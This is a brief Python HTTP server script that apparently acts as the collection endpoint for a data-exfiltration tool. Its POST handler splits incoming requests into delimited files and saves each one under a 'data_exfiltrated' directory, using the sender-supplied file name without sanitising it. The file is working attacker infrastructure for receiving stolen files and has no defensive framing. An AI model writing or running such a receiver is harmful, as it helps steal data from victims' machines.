import os
import base64

from http.server import BaseHTTPRequestHandler, HTTPServer

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()

        message = "Hello, World! Here is a GET response"
        self.wfile.write(bytes(message, "utf8"))
        print(self.request)
        
        
        
        
        
        
        
        
    def do_POST(self):
        
        
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()



        received_files=post_data.split(b'\\EndOfFile')[:-1] #deleting last element as it's just an empty bytestr
        for file in received_files :
                name_file=file.split(b"file : ")[1].split(b"\n")[0] #get file name
                print(name_file.decode()+" is here!")
                file=file.split(b"file : ")[1].split(b"\n",1)[1] #get rest of file
                print(file[:30])
                temp_file_to_write = open("./data_exfiltrated/"+name_file.decode(), "wb") 
                temp_file_to_write.write(file)
                temp_file_to_write.close() 


with HTTPServer(('', 8080), handler) as server:
    server.serve_forever()
